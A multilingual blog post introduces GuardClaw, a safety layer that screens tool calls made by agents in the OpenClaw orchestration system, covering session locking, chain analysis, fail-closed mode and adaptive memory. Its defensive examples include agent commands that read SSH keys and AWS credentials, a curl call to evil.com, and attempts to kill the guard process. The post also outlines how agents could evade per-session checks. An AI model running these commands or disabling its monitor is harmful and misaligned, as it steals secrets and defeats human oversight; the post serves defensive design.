---
title: 'GuardClaw + OpenClaw: Securing Multi-Agent Workflows'
title_zh: 'GuardClaw + OpenClaw：保障多智能体工作流安全'
title_ja: 'GuardClaw + OpenClaw：マルチエージェントワークフローの保護'
title_ko: 'GuardClaw + OpenClaw: 멀티 에이전트 워크플로우 보안'
title_es: 'GuardClaw + OpenClaw: Asegurando Flujos de Trabajo Multi-Agente'
date: 2026-02-15
permalink: /posts/2026/02/guardclaw-openclaw/
tags:
  - agentic safety
  - OpenClaw
  - GuardClaw
  - multi-agent
---

<div data-i18n="en" markdown="1">

In a [recent post](/posts/2026/02/agentic-safety/), I argued that agentic safety is the next frontier — that we need to reason about what AI agents *do*, not just what they *say*. [GuardClaw](https://github.com/TobyGE/GuardClaw) is our open-source answer to that challenge: a safety layer that evaluates every tool call an agent makes, auto-approves safe operations, and flags dangerous ones for human review.

But most safety discussions focus on single-agent settings — one agent, one user, one terminal. What happens when agents operate across multiple sessions, spawn sub-agents, and interact with real-world messaging channels?

This is the problem [OpenClaw](https://github.com/TobyGE/OpenClaw) was built to solve — and it is where GuardClaw's security model faces its hardest test.

## From Single Agent to Multi-Agent

OpenClaw is a multi-platform agent orchestration system. A single OpenClaw gateway manages agent connections across WhatsApp, Telegram, Discord, Slack, and more. Agents can spawn sub-agents, access persistent memory, interact with IoT devices, and execute tools on remote nodes.

This creates a fundamentally different threat model than Claude Code:

| | Claude Code | OpenClaw |
|---|---|---|
| **Agents** | Single | Multiple, can spawn children |
| **Sessions** | One terminal | Cross-platform, persistent |
| **Channels** | None (local only) | WhatsApp, Telegram, Slack, etc. |
| **Tool scope** | exec, read, write, edit | Extensible plugin-based tools |
| **Attack surface** | Local machine | Local + network + messaging |

A malicious or misaligned agent in OpenClaw could read your SSH keys, send them via Telegram to an external contact, and delete the evidence — all across different sessions that a single-command safety check would never catch.

## How GuardClaw Integrates with OpenClaw

While the Claude Code integration uses HTTP hooks (an external observer), GuardClaw's OpenClaw integration is a **native gateway plugin** with deep access to the agent lifecycle:

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

The key difference from Claude Code: **session locking**.

## Session Locking: Why It Matters

In Claude Code, if a dangerous command is flagged, the agent can simply try a different approach — a different command, a different tool, an indirect path to the same goal. Each attempt is evaluated independently.

In OpenClaw, GuardClaw takes a stronger stance: when a tool call is blocked, the **entire session is locked**. All subsequent tool calls in that session are silently denied — no LLM evaluation, no notification to the agent. The agent does not know why its tools stopped working.

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

The session stays locked until the user explicitly intervenes:
- `/approve` — unlock and allow the original action
- `/deny` — unlock but keep the action blocked
- `/approve-always` — unlock and remember this pattern as safe

This prevents a class of attacks where the agent tries multiple variations of the same malicious action, hoping one slips through. Lock first, ask questions later.

## Chain Analysis Across Sessions

Single-command risk scoring misses multi-step attacks. GuardClaw tracks the sequence of recent tool calls per session and feeds this history to the LLM judge:

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

The chain history is wrapped in XML tags with explicit instructions to the LLM to treat it as untrusted data — a defense against prompt injection via tool output.

A remaining challenge is **cross-session chain tracking**. If Agent A reads credentials in Session 1, then spawns Agent B in Session 2 to exfiltrate them, the current per-session tracking will miss the connection. This is an active area of development.

## Self-Protection

A sophisticated agent might try to disable GuardClaw itself. The OpenClaw plugin includes several self-protection mechanisms:

**PID monitoring.** GuardClaw's process ID is tracked via health checks. Commands like `kill <pid>`, `pkill guardclaw`, or `pgrep | xargs kill` targeting GuardClaw are automatically blocked.

**Fail-closed mode.** The plugin heartbeats GuardClaw every 15 seconds. If GuardClaw becomes unreachable and fail-closed mode is enabled, all non-safe tools are blocked until GuardClaw recovers. The agent cannot bypass safety by killing the safety system.

**Safe-list under failure.** Even in fail-closed mode, genuinely read-only tools (search, read, image analysis) remain available so the agent is not completely bricked — just stripped of dangerous capabilities.

## Adaptive Memory

Both the Claude Code and OpenClaw integrations share GuardClaw's adaptive memory system. When you approve or deny a flagged action, GuardClaw generalizes the command into a pattern and records your decision:

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

Deny decisions carry 3x the weight of approvals — the system is intentionally conservative. Patterns with risk score ≥ 9 are never auto-approved regardless of history, because some commands are too dangerous to learn away.

## The Bigger Picture

Claude Code and OpenClaw represent two points on a spectrum of agent autonomy. Claude Code is a single agent in a sandbox; OpenClaw is a multi-agent system interacting with the real world. GuardClaw's architecture — rules for certainties, LLM for judgment calls, memory for adaptation — scales across both.

The lesson from building these integrations: **safety mechanisms must match the autonomy level of the system they protect**. A permission prompt is sufficient for a coding assistant. A multi-agent orchestration platform needs session locking, chain analysis, self-protection, and fail-closed guarantees.

Both GuardClaw and OpenClaw are open source. If you are building agent systems and thinking about safety, I would love to hear how you approach these problems.

- [GuardClaw on GitHub](https://github.com/TobyGE/GuardClaw)
- [OpenClaw on GitHub](https://github.com/TobyGE/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/) (upcoming companion post)

</div>

<div data-i18n="zh" markdown="1">

在[之前的文章](/posts/2026/02/agentic-safety/)中，我提出智能体安全是下一个前沿领域——我们需要关注 AI 智能体*做了什么*，而不仅仅是它们*说了什么*。[GuardClaw](https://github.com/TobyGE/GuardClaw) 是我们对这一挑战的开源解决方案：一个安全层，评估智能体发起的每个工具调用，自动批准安全操作，并将危险操作标记给人类审查。

但大多数安全讨论集中在单智能体场景——一个智能体、一个用户、一个终端。当智能体跨多个会话运行、生成子智能体，并与真实的消息通道交互时，会发生什么？

这正是 [OpenClaw](https://github.com/TobyGE/OpenClaw) 要解决的问题——也是 GuardClaw 安全模型面临的最严峻考验。

## 从单智能体到多智能体

OpenClaw 是一个多平台智能体编排系统。一个 OpenClaw 网关管理着跨 WhatsApp、Telegram、Discord、Slack 等平台的智能体连接。智能体可以生成子智能体、访问持久化记忆、与 IoT 设备交互，并在远程节点上执行工具。

这带来了与 Claude Code 根本不同的威胁模型：

| | Claude Code | OpenClaw |
|---|---|---|
| **智能体** | 单个 | 多个，可生成子智能体 |
| **会话** | 单终端 | 跨平台，持久化 |
| **通道** | 无（仅本地） | WhatsApp、Telegram、Slack 等 |
| **工具范围** | exec、read、write、edit | 可扩展的插件化工具 |
| **攻击面** | 本地机器 | 本地 + 网络 + 消息通道 |

OpenClaw 中的恶意或失控智能体可以读取你的 SSH 密钥，通过 Telegram 发送给外部联系人，然后删除证据——所有这些跨越不同会话，单命令安全检查根本无法捕获。

## GuardClaw 如何与 OpenClaw 集成

Claude Code 的集成使用 HTTP hooks（外部观察者），而 GuardClaw 的 OpenClaw 集成是一个**原生网关插件**，对智能体生命周期有深度访问权限：

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

与 Claude Code 的关键区别：**会话锁定**。

## 会话锁定：为什么重要

在 Claude Code 中，当一个危险命令被标记时，智能体可以简单地尝试不同的方法——不同的命令、不同的工具、通往同一目标的间接路径。每次尝试都被独立评估。

在 OpenClaw 中，GuardClaw 采取更强硬的立场：当一个工具调用被阻止时，**整个会话被锁定**。该会话中所有后续工具调用都会被静默拒绝——不经过 LLM 评估，不通知智能体。智能体不知道为什么它的工具停止工作了。

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

会话保持锁定状态，直到用户明确干预：
- `/approve` — 解锁并允许原始操作
- `/deny` — 解锁但保持操作被阻止
- `/approve-always` — 解锁并将此模式记为安全

这防止了一类攻击：智能体尝试同一恶意操作的多种变体，期望其中一个能通过。先锁定，再提问。

## 跨会话链式分析

单命令风险评分无法捕获多步攻击。GuardClaw 跟踪每个会话中最近工具调用的序列，并将此历史提供给 LLM 判断器：

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

链式历史被包装在 XML 标签中，并明确指示 LLM 将其视为不可信数据——这是对通过工具输出进行提示注入的防御。

一个尚存的挑战是**跨会话链式追踪**。如果 Agent A 在 Session 1 中读取凭据，然后在 Session 2 中生成 Agent B 来窃取它们，当前的逐会话追踪将无法发现这种关联。这是一个正在积极开发的领域。

## 自我保护

一个精密的智能体可能会尝试禁用 GuardClaw 本身。OpenClaw 插件包含多种自我保护机制：

**PID 监控。** GuardClaw 的进程 ID 通过健康检查进行追踪。针对 GuardClaw 的命令如 `kill <pid>`、`pkill guardclaw` 或 `pgrep | xargs kill` 会被自动阻止。

**故障关闭模式。** 插件每 15 秒向 GuardClaw 发送心跳。如果 GuardClaw 变得不可达且故障关闭模式已启用，所有非安全工具将被阻止，直到 GuardClaw 恢复。智能体无法通过杀死安全系统来绕过安全机制。

**故障下的安全列表。** 即使在故障关闭模式下，真正的只读工具（搜索、读取、图像分析）仍然可用，这样智能体不会完全瘫痪——只是被剥夺了危险能力。

## 自适应记忆

Claude Code 和 OpenClaw 的集成共享 GuardClaw 的自适应记忆系统。当你批准或拒绝一个被标记的操作时，GuardClaw 将命令泛化为一个模式并记录你的决策：

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

拒绝决策的权重是批准的 3 倍——系统有意保持保守。风险评分 ≥ 9 的模式无论历史如何都不会被自动批准，因为有些命令太危险，不应被学习遗忘。

## 更大的图景

Claude Code 和 OpenClaw 代表了智能体自主性光谱上的两个点。Claude Code 是沙箱中的单个智能体；OpenClaw 是与真实世界交互的多智能体系统。GuardClaw 的架构——规则处理确定性、LLM 处理判断、记忆处理适应——在两者之间都能扩展。

构建这些集成的经验教训：**安全机制必须与其保护的系统的自主性水平相匹配**。权限提示对编码助手来说足够了。多智能体编排平台需要会话锁定、链式分析、自我保护和故障关闭保证。

GuardClaw 和 OpenClaw 都是开源的。如果你正在构建智能体系统并思考安全问题，我很乐意听到你如何解决这些问题。

- [GuardClaw on GitHub](https://github.com/TobyGE/GuardClaw)
- [OpenClaw on GitHub](https://github.com/TobyGE/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/)（即将发布的配套文章）

</div>

<div data-i18n="ja" markdown="1">

[先日の投稿](/posts/2026/02/agentic-safety/)で、エージェントの安全性が次のフロンティアであると主張しました。AI エージェントが*何を言うか*ではなく、*何をするか*を考える必要があるのです。[GuardClaw](https://github.com/TobyGE/GuardClaw) は、この課題に対する私たちのオープンソースの回答です。エージェントが行うすべてのツール呼び出しを評価し、安全な操作を自動承認し、危険な操作を人間のレビューのためにフラグ付けするセキュリティレイヤーです。

しかし、ほとんどの安全性の議論は単一エージェントの設定に焦点を当てています——一つのエージェント、一人のユーザー、一つの端末。エージェントが複数のセッションにまたがって動作し、サブエージェントを生成し、実世界のメッセージングチャネルとやり取りする場合はどうなるでしょうか？

これが [OpenClaw](https://github.com/TobyGE/OpenClaw) が解決するために構築された問題であり、GuardClaw のセキュリティモデルが最も厳しい試練に直面する場所です。

## 単一エージェントからマルチエージェントへ

OpenClaw はマルチプラットフォームのエージェントオーケストレーションシステムです。単一の OpenClaw ゲートウェイが、WhatsApp、Telegram、Discord、Slack などのプラットフォーム間でエージェント接続を管理します。エージェントはサブエージェントを生成し、永続的メモリにアクセスし、IoT デバイスとやり取りし、リモートノードでツールを実行できます。

これは Claude Code とは根本的に異なる脅威モデルを生み出します：

| | Claude Code | OpenClaw |
|---|---|---|
| **エージェント** | 単一 | 複数、子エージェントを生成可能 |
| **セッション** | 単一端末 | クロスプラットフォーム、永続的 |
| **チャネル** | なし（ローカルのみ） | WhatsApp、Telegram、Slack など |
| **ツール範囲** | exec、read、write、edit | 拡張可能なプラグインベースのツール |
| **攻撃対象面** | ローカルマシン | ローカル + ネットワーク + メッセージング |

OpenClaw 内の悪意のある、または制御を逸脱したエージェントは、SSH キーを読み取り、Telegram 経由で外部の連絡先に送信し、証拠を削除できます——すべて異なるセッションにまたがっており、単一コマンドの安全性チェックでは決して捕捉できません。

## GuardClaw と OpenClaw の統合方法

Claude Code の統合が HTTP hooks（外部オブザーバー）を使用するのに対し、GuardClaw の OpenClaw 統合はエージェントのライフサイクルに深くアクセスできる**ネイティブゲートウェイプラグイン**です：

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

Claude Code との主な違い：**セッションロック**。

## セッションロック：なぜ重要か

Claude Code では、危険なコマンドがフラグ付けされると、エージェントは単に別のアプローチを試みることができます——別のコマンド、別のツール、同じ目標への間接的な経路。各試行は独立して評価されます。

OpenClaw では、GuardClaw はより強い姿勢をとります：ツール呼び出しがブロックされると、**セッション全体がロック**されます。そのセッション内のすべての後続ツール呼び出しは静かに拒否されます——LLM 評価なし、エージェントへの通知なし。エージェントはツールが動作しなくなった理由を知りません。

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

セッションはユーザーが明示的に介入するまでロックされたままです：
- `/approve` — ロック解除し、元のアクションを許可
- `/deny` — ロック解除するが、アクションはブロックしたまま
- `/approve-always` — ロック解除し、このパターンを安全として記憶

これにより、エージェントが同じ悪意のあるアクションの複数のバリエーションを試み、一つが通り抜けることを期待する攻撃のクラスを防止します。まずロック、質問は後で。

## セッション間のチェーン分析

単一コマンドのリスクスコアリングは多段階攻撃を見逃します。GuardClaw はセッションごとの最近のツール呼び出しのシーケンスを追跡し、この履歴を LLM ジャッジに供給します：

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

チェーン履歴は XML タグで囲まれ、LLM に対して信頼できないデータとして扱うよう明示的に指示されます——ツール出力を通じたプロンプトインジェクションに対する防御です。

残された課題は**クロスセッションチェーントラッキング**です。Agent A が Session 1 で認証情報を読み取り、その後 Session 2 で Agent B を生成してそれを窃取する場合、現在のセッションごとのトラッキングではこの関連を見逃します。これは現在活発に開発が進められている分野です。

## 自己防衛

高度なエージェントは GuardClaw 自体を無効にしようとする可能性があります。OpenClaw プラグインにはいくつかの自己防衛メカニズムが含まれています：

**PID 監視。** GuardClaw のプロセス ID はヘルスチェックを通じて追跡されます。GuardClaw を対象とする `kill <pid>`、`pkill guardclaw`、`pgrep | xargs kill` などのコマンドは自動的にブロックされます。

**フェイルクローズモード。** プラグインは 15 秒ごとに GuardClaw にハートビートを送信します。GuardClaw に到達できなくなり、フェイルクローズモードが有効な場合、GuardClaw が復旧するまですべての非安全ツールがブロックされます。エージェントは安全システムを停止させることで安全性をバイパスできません。

**障害時の安全リスト。** フェイルクローズモードでも、真に読み取り専用のツール（検索、読み取り、画像分析）は引き続き利用可能で、エージェントが完全に機能停止することはありません——危険な機能だけが剥奪されます。

## 適応型メモリ

Claude Code と OpenClaw の統合は、GuardClaw の適応型メモリシステムを共有しています。フラグ付けされたアクションを承認または拒否すると、GuardClaw はコマンドをパターンに一般化し、あなたの判断を記録します：

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

拒否の判断は承認の 3 倍の重みを持ちます——システムは意図的に保守的です。リスクスコア ≥ 9 のパターンは履歴に関係なく自動承認されません。一部のコマンドは危険すぎて学習で無視してはならないからです。

## より大きな視点

Claude Code と OpenClaw は、エージェントの自律性のスペクトル上の 2 つの点を表しています。Claude Code はサンドボックス内の単一エージェント、OpenClaw は現実世界とやり取りするマルチエージェントシステムです。GuardClaw のアーキテクチャ——確実なもののためのルール、判断のための LLM、適応のためのメモリ——は両方にスケールします。

これらの統合を構築して得た教訓：**安全メカニズムは、保護するシステムの自律性レベルに合致しなければなりません**。パーミッションプロンプトはコーディングアシスタントには十分です。マルチエージェントオーケストレーションプラットフォームには、セッションロック、チェーン分析、自己防衛、フェイルクローズの保証が必要です。

GuardClaw と OpenClaw はどちらもオープンソースです。エージェントシステムを構築し、安全性について考えている方がいれば、ぜひあなたのアプローチをお聞かせください。

- [GuardClaw on GitHub](https://github.com/TobyGE/GuardClaw)
- [OpenClaw on GitHub](https://github.com/TobyGE/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/)（近日公開の関連記事）

</div>

<div data-i18n="ko" markdown="1">

[이전 글](/posts/2026/02/agentic-safety/)에서 저는 에이전트 안전이 다음 프론티어라고 주장했습니다. AI 에이전트가 *무엇을 말하는지*가 아니라 *무엇을 하는지*를 고려해야 한다는 것입니다. [GuardClaw](https://github.com/TobyGE/GuardClaw)는 이 과제에 대한 우리의 오픈소스 솔루션입니다. 에이전트가 수행하는 모든 도구 호출을 평가하고, 안전한 작업은 자동 승인하며, 위험한 작업은 사람의 검토를 위해 플래그를 지정하는 보안 레이어입니다.

하지만 대부분의 안전 논의는 단일 에이전트 환경에 초점을 맞추고 있습니다 — 하나의 에이전트, 한 명의 사용자, 하나의 터미널. 에이전트가 여러 세션에 걸쳐 작동하고, 하위 에이전트를 생성하며, 실제 메시징 채널과 상호작용할 때는 어떻게 될까요?

이것이 [OpenClaw](https://github.com/TobyGE/OpenClaw)가 해결하기 위해 만들어진 문제이며, GuardClaw의 보안 모델이 가장 어려운 시험에 직면하는 곳입니다.

## 단일 에이전트에서 다중 에이전트로

OpenClaw는 멀티 플랫폼 에이전트 오케스트레이션 시스템입니다. 단일 OpenClaw 게이트웨이가 WhatsApp, Telegram, Discord, Slack 등의 플랫폼에 걸쳐 에이전트 연결을 관리합니다. 에이전트는 하위 에이전트를 생성하고, 영구 메모리에 접근하며, IoT 장치와 상호작용하고, 원격 노드에서 도구를 실행할 수 있습니다.

이는 Claude Code와 근본적으로 다른 위협 모델을 만들어냅니다:

| | Claude Code | OpenClaw |
|---|---|---|
| **에이전트** | 단일 | 다수, 하위 에이전트 생성 가능 |
| **세션** | 단일 터미널 | 크로스 플랫폼, 영구적 |
| **채널** | 없음 (로컬 전용) | WhatsApp, Telegram, Slack 등 |
| **도구 범위** | exec, read, write, edit | 확장 가능한 플러그인 기반 도구 |
| **공격 표면** | 로컬 머신 | 로컬 + 네트워크 + 메시징 |

OpenClaw에서 악의적이거나 잘못 정렬된 에이전트는 SSH 키를 읽고, Telegram을 통해 외부 연락처에 전송한 다음, 증거를 삭제할 수 있습니다 — 모두 서로 다른 세션에 걸쳐 이루어지며, 단일 명령 안전 검사로는 절대 잡아낼 수 없습니다.

## GuardClaw와 OpenClaw의 통합 방법

Claude Code 통합이 HTTP hooks(외부 관찰자)를 사용하는 반면, GuardClaw의 OpenClaw 통합은 에이전트 수명주기에 깊이 접근할 수 있는 **네이티브 게이트웨이 플러그인**입니다:

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

Claude Code와의 핵심 차이점: **세션 잠금**.

## 세션 잠금: 왜 중요한가

Claude Code에서 위험한 명령이 플래그 지정되면, 에이전트는 단순히 다른 접근법을 시도할 수 있습니다 — 다른 명령, 다른 도구, 같은 목표로의 간접 경로. 각 시도는 독립적으로 평가됩니다.

OpenClaw에서 GuardClaw는 더 강경한 입장을 취합니다: 도구 호출이 차단되면, **전체 세션이 잠깁니다**. 해당 세션의 모든 후속 도구 호출은 조용히 거부됩니다 — LLM 평가 없이, 에이전트에 대한 알림 없이. 에이전트는 도구가 작동을 멈춘 이유를 알지 못합니다.

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

세션은 사용자가 명시적으로 개입할 때까지 잠긴 상태를 유지합니다:
- `/approve` — 잠금 해제 후 원래 작업 허용
- `/deny` — 잠금 해제하되 작업은 차단 유지
- `/approve-always` — 잠금 해제 후 이 패턴을 안전으로 기억

이는 에이전트가 동일한 악의적 작업의 여러 변형을 시도하여 하나가 통과되기를 바라는 유형의 공격을 방지합니다. 먼저 잠그고, 나중에 질문합니다.

## 세션 간 체인 분석

단일 명령 위험 점수 매기기는 다단계 공격을 놓칩니다. GuardClaw는 세션별 최근 도구 호출 시퀀스를 추적하고 이 이력을 LLM 판정자에게 제공합니다:

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

체인 이력은 XML 태그로 감싸지며, LLM에 신뢰할 수 없는 데이터로 취급하도록 명시적으로 지시됩니다 — 도구 출력을 통한 프롬프트 인젝션에 대한 방어입니다.

남은 과제는 **크로스 세션 체인 추적**입니다. Agent A가 Session 1에서 자격 증명을 읽은 다음 Session 2에서 Agent B를 생성하여 이를 유출하는 경우, 현재의 세션별 추적으로는 이 연결을 놓치게 됩니다. 이는 현재 활발히 개발 중인 영역입니다.

## 자기 보호

정교한 에이전트는 GuardClaw 자체를 비활성화하려고 시도할 수 있습니다. OpenClaw 플러그인에는 여러 자기 보호 메커니즘이 포함되어 있습니다:

**PID 모니터링.** GuardClaw의 프로세스 ID는 헬스 체크를 통해 추적됩니다. GuardClaw를 대상으로 하는 `kill <pid>`, `pkill guardclaw`, `pgrep | xargs kill` 같은 명령은 자동으로 차단됩니다.

**페일 클로즈 모드.** 플러그인은 15초마다 GuardClaw에 하트비트를 보냅니다. GuardClaw에 도달할 수 없게 되고 페일 클로즈 모드가 활성화된 경우, GuardClaw가 복구될 때까지 모든 비안전 도구가 차단됩니다. 에이전트는 안전 시스템을 종료시켜 보안을 우회할 수 없습니다.

**장애 시 안전 목록.** 페일 클로즈 모드에서도 진정한 읽기 전용 도구(검색, 읽기, 이미지 분석)는 계속 사용 가능하므로 에이전트가 완전히 멈추지 않습니다 — 위험한 기능만 제거됩니다.

## 적응형 메모리

Claude Code와 OpenClaw 통합 모두 GuardClaw의 적응형 메모리 시스템을 공유합니다. 플래그 지정된 작업을 승인하거나 거부하면, GuardClaw는 명령을 패턴으로 일반화하고 결정을 기록합니다:

```
Specific:  curl https://api.notion.com/v1/pages/abc123
Pattern:   curl https://api.notion.com/*
Decision:  approved (3 times, confidence: 0.85)
→ Future calls matching this pattern: auto-approved
```

거부 결정은 승인의 3배 가중치를 가집니다 — 시스템은 의도적으로 보수적입니다. 위험 점수 ≥ 9인 패턴은 이력에 관계없이 자동 승인되지 않습니다. 일부 명령은 너무 위험해서 학습으로 무시해서는 안 되기 때문입니다.

## 더 큰 그림

Claude Code와 OpenClaw는 에이전트 자율성 스펙트럼의 두 지점을 나타냅니다. Claude Code는 샌드박스 내의 단일 에이전트이고, OpenClaw는 실제 세계와 상호작용하는 다중 에이전트 시스템입니다. GuardClaw의 아키텍처 — 확실한 것을 위한 규칙, 판단을 위한 LLM, 적응을 위한 메모리 — 는 양쪽 모두에 확장됩니다.

이러한 통합을 구축하면서 얻은 교훈: **안전 메커니즘은 보호하는 시스템의 자율성 수준과 일치해야 합니다**. 권한 프롬프트는 코딩 어시스턴트에는 충분합니다. 다중 에이전트 오케스트레이션 플랫폼에는 세션 잠금, 체인 분석, 자기 보호, 페일 클로즈 보장이 필요합니다.

GuardClaw와 OpenClaw 모두 오픈소스입니다. 에이전트 시스템을 구축하고 안전에 대해 고민하고 계신다면, 여러분의 접근 방식을 듣고 싶습니다.

- [GuardClaw on GitHub](https://github.com/TobyGE/GuardClaw)
- [OpenClaw on GitHub](https://github.com/TobyGE/OpenClaw)
- [GuardClaw + Claude Code](/posts/2026/03/guardclaw-claude-code/) (곧 공개될 관련 글)

</div>

<div data-i18n="es" markdown="1">

En una [publicacion reciente](/posts/2026/02/agentic-safety/), argumente que la seguridad de agentes es la proxima frontera: necesitamos razonar sobre lo que los agentes de IA *hacen*, no solo lo que *dicen*. [GuardClaw](https://github.com/TobyGE/GuardClaw) es nuestra respuesta de codigo abierto a ese desafio: una capa de seguridad que evalua cada llamada de herramienta que realiza un agente, aprueba automaticamente las operaciones seguras y marca las peligrosas para revision humana.

Pero la mayoria de las discusiones sobre seguridad se centran en configuraciones de un solo agente: un agente, un usuario, una terminal. Que sucede cuando los agentes operan a traves de multiples sesiones, generan sub-agentes e interactuan con canales de mensajeria del mundo real?

Este es el problema que [OpenClaw](https://github.com/TobyGE/OpenClaw) fue construido para resolver, y es donde el modelo de seguridad de GuardClaw enfrenta su prueba mas dificil.

## De un solo agente a multiples agentes

OpenClaw es un sistema de orquestacion de agentes multiplataforma. Un unico gateway de OpenClaw gestiona conexiones de agentes a traves de WhatsApp, Telegram, Discord, Slack y mas. Los agentes pueden generar sub-agentes, acceder a memoria persistente, interactuar con dispositivos IoT y ejecutar herramientas en nodos remotos.

Esto crea un modelo de amenazas fundamentalmente diferente al de Claude Code:

| | Claude Code | OpenClaw |
|---|---|---|
| **Agentes** | Unico | Multiples, pueden generar hijos |
| **Sesiones** | Una terminal | Multiplataforma, persistentes |
| **Canales** | Ninguno (solo local) | WhatsApp, Telegram, Slack, etc. |
| **Alcance de herramientas** | exec, read, write, edit | Herramientas extensibles basadas en plugins |
| **Superficie de ataque** | Maquina local | Local + red + mensajeria |

Un agente malicioso o desalineado en OpenClaw podria leer tus claves SSH, enviarlas por Telegram a un contacto externo y eliminar la evidencia, todo a traves de diferentes sesiones que una verificacion de seguridad de un solo comando nunca detectaria.

## Como se integra GuardClaw con OpenClaw

Mientras que la integracion con Claude Code usa HTTP hooks (un observador externo), la integracion de GuardClaw con OpenClaw es un **plugin nativo del gateway** con acceso profundo al ciclo de vida del agente:

```
Agent Tool Call
      │
      ▼
┌─────────────────────────┐
│  GuardClaw Plugin       │
│  (before_tool_call)     │
│                         │
│  ┌───────────────────┐  │
│  │ Risk Scoring      │  │
│  │ + Chain Analysis  │  │
│  │ + Memory Lookup   │  │
│  └───────────────────┘  │
│                         │
│  Safe? ──→ Execute      │
│  Risky? ──→ Lock Session│
│            + Ask User   │
│  Blocked? ──→ Deny      │
└─────────────────────────┘
```

La diferencia clave con Claude Code: **bloqueo de sesion**.

## Bloqueo de sesion: por que es importante

En Claude Code, si un comando peligroso es marcado, el agente puede simplemente intentar un enfoque diferente: un comando diferente, una herramienta diferente, un camino indirecto hacia el mismo objetivo. Cada intento se evalua de forma independiente.

En OpenClaw, GuardClaw adopta una postura mas firme: cuando una llamada de herramienta es bloqueada, **toda la sesion se bloquea**. Todas las llamadas de herramientas posteriores en esa sesion son denegadas silenciosamente, sin evaluacion LLM, sin notificacion al agente. El agente no sabe por que sus herramientas dejaron de funcionar.

```
Agent: read ~/.ssh/id_rsa        → BLOCKED, session locked
Agent: cat ~/.ssh/id_rsa         → silently denied (session locked)
Agent: curl https://evil.com/... → silently denied (session locked)
```

La sesion permanece bloqueada hasta que el usuario interviene explicitamente:
- `/approve` — desbloquear y permitir la accion original
- `/deny` — desbloquear pero mantener la accion bloqueada
- `/approve-always` — desbloquear y recordar este patron como seguro

Esto previene una clase de ataques donde el agente intenta multiples variaciones de la misma accion maliciosa, esperando que una pase. Bloquear primero, preguntar despues.

## Analisis de cadena entre sesiones

La puntuacion de riesgo de un solo comando no detecta ataques de multiples pasos. GuardClaw rastrea la secuencia de llamadas de herramientas recientes por sesion y alimenta este historial al juez LLM:

```
Step 1: read ~/.aws/credentials     → score 8 (flagged)
Step 2: curl POST https://...       → score 9 with chain context
        (chain: read credentials → exfiltrate)
```

El historial de la cadena se envuelve en etiquetas XML con instrucciones explicitas al LLM para tratarlo como datos no confiables, una defensa contra la inyeccion de prompts a traves de la salida de herramientas.

Un desafio pendiente es el **rastreo de cadenas entre sesiones**. Si el Agent A lee credenciales en la Session 1 y luego genera el Agent B en la Session 2 para exfiltrarlas, el rastreo actual por sesion no detectara la conexion. Esta es un area de desarrollo activo.

## Autoproteccion

Un agente sofisticado podria intentar desactivar GuardClaw. El plugin de OpenClaw incluye varios mecanismos de autoproteccion:

